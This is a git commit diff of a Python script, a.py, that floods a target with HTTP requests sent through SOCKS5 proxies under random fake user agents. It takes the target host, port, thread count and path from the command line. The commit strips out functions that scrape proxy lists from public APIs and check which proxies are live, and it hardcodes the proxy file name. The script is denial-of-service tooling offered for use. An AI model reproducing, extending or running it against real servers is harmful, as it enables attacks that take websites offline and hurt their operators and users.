da1abe090ba0bec67416be4ba6c399c81b7e4102
Võ Bảo <87627629+kenegdane@users.noreply.github.com>
2021-09-10 11:19:28 +0700

    Update a.py

--- a.py
+++ a.py
@@ -1,11 +1,9 @@
 import ssl
-import threading, multiprocessing
-import socket
+import multiprocessing
 import random
 import time
 import sys
 import socks # pysocks
-import requests # requests
 from fake_useragent import UserAgent # fake-useragent
  
 # Init
@@ -15,7 +13,6 @@ targetPort = int(sys.argv[2])
 threadNumber = int(sys.argv[3])
 targetPath = sys.argv[4]
 rI = random.randint
-proxyFile = "socks5.txt"
 rC = random.choice
 queryParams = [
     "s",
@@ -29,56 +26,6 @@ queryParams = [
     "data",
     "field"
 ]
-proxyResources = [
-    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
-    'https://www.proxy-list.download/api/v1/get?type=socks5',
-    'https://www.proxyscan.io/download?type=socks5',
-]
- 
-connectProxyHeader = f"GET / HTTP/1.1\r\nHost: {targetHost}\r\n\r\n"
- 
-def socksCrawler():
-    global socksFile, socksResources
-    f = open(proxyFile, "wb")
-    for url in proxyResources:
-        try:
-            f.write(requests.get(url).content)
-        except:
-            pass
-    f.close()
- 
- 
-def connectProxy(proxy):
-    global liveProxies
-    proxySplit = proxy.strip().split(":")
-    s = socks.socksocket()
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.set_proxy(socks.SOCKS5, str(proxySplit[0]), int(proxySplit[1]))
-    s.settimeout(10)
-    try:
-        s.connect((targetHost, targetPort))
-        if targetPort == 443:
-            s = ssl.create_default_context().wrap_socket(s, server_hostname = targetHost)
-        s.send(str(connectProxyHeader).encode())
-        print("Connected successfully " + proxySplit[0] + ":" + proxySplit[1])
-    except:
-        proxies.remove(proxy)
-        print("Disconnected " + proxySplit[0] + ":" + proxySplit[1])
-def checkProxies():
-    global liveProxies
-    threadList = []
-    for proxy in proxies:
-        thread = threading.Thread(target = connectProxy, args = (proxy, ))
-        thread.start()
-        threadList.append(thread)
-        sys.stdout.flush()
-    for thread in threadList:
-        thread.join()
-        sys.stdout.flush()
-    f = open(proxyFile, "w")
-    for proxy in proxies:
-        f.write(proxy)
-    f.close()
 time.sleep(1)
 def Flood(indexPicker):
     if indexPicker < len(proxies):
@@ -112,22 +59,8 @@ def Flood(indexPicker):
         except:
             pass
  
-if "--socksCrawler" in sys.argv:
-    socksCrawler()
-else:
-    pass
- 
-if "--useMyFile" in sys.argv:
-    proxyFile = input("Your file: ")
-    proxies = open(proxyFile).readlines()
-else:
-    proxies = open("socks5.txt").readlines()
- 
-if "--checkProxies" in sys.argv:
-    proxies = open(proxyFile).readlines()
-    checkProxies()
-else:
-    proxies = open("socks5.txt").readlines()
+proxies = open("socks5.txt").readlines()
+
 userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
